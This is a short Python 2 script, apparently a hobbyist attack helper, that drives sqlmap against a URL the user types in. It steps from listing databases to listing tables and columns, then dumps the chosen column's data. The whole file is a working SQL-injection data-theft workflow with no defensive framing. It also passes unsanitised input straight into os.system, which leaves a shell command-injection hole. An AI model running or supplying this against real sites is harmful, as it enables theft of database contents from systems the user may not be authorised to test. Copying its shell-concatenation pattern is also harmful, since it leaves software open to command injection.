import os
url=str(raw_input('Url:'))
url=url.replace("http://","")
url=url.replace("https://","")
db=os.system("sqlmap --url "+url+" --dbs") 
print db
url_d=str(raw_input("DataBase :"))
tb=os.system("sqlmap --url "+url+" -D "+url_d+" --tables")
print tb  
url_t=str(raw_input("Table :"))
cl=os.system("sqlmap --url "+url+" -D "+url_d+" -T "+url_t+" --columns")
print cl
url_c=str(raw_input("Column :"))
dp=os.system("sqlmap --url "+url+" -D "+url_d+" -T "+url_t+" -C "+url_c+" --dump")
print dp
print "[*]Exiting..."
